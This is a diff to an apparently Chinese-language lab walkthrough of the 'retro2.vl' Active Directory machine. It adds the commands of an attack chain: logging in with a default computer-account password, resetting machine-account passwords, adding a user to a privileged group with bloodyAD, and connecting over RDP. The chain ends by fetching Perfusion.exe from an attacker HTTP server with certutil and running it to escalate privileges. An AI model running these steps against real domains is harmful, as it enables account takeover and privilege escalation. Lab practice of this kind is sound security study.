@@ -100,6 +100,46 @@ $ bloodhound-python -u 'ldapreader' -p 'ppYaVcB5R' -d retro2.vl --zip -c All -dc
 https://medium.com/@offsecdeer/finding-weak-ad-computer-passwords-e3dc1ed220df
 在网上搜索这方面的信息时，它解释了计算机创建的的SamAccountName的密码，帐户用小写减去美元符号
 ```
-$ wget https://raw.githubusercontent.com/api0cradle/impacket/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py
+$ nxc smb BLN01.retro2.vl -u 'fs01$' -p 'fs01'
 ```
+![还要继续吗](images/081115.png)
+
+#### 改密码
+```
+$ wget https://raw.githubusercontent.com/api0cradle/impacket/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py
+
+$ python3 rpcchangepwd.py retro2.vl/fs01\$:fs01@10.129.245.212 -newpass Roguel
+
+$ nxc smb BLN01.retro2.vl -u 'fs01$' -p 'Roguel'
+
+$ net rpc password 'ADMWS01$' Roguel -U retro2.vl/'fs01$'%Roguel -S BLN01.retro2.vl
+
+$ nxc smb BLN01.retro2.vl -u 'ADMWS01$' -p 'Roguel'
+```
+#### 上瑞士军刀 加入服务器
+```
+$ git clone https://github.com/CravateRouge/bloodyAD
+$ cd bloodyAD
+$ pip install .
+
+$ bloodyAD --host 10.129.245.212 -d retro2.vl -u 'ADMWS01$' -p 'Roguel' add groupMember 'SERVICES' 'ldapreader'
+```
+![还要继续吗](images/081116.png)
+#### 进入windowns
+```
+$ xfreerdp /u:'ldapreader' /p:'ppYaVcB5R' /v:10.129.245.212 /d:retro2.vl /tls-seclevel:0
+```
+#### 下载工具
+```
+$ wget https://raw.githubusercontent.com/itm4n/Perfusion/refs/heads/master/Perfusion.sln
+$ python3 -m http.server 80
+```
+
+```
+PS C:\Users\ldapreader> certutil.exe -urlcache -f http://10.10.14.69/Perfusion.exe
+Perfusion.exe
+
+PS C:\Users\ldapreader> .\Perfusion.exe -c cmd -i
+```
+
 
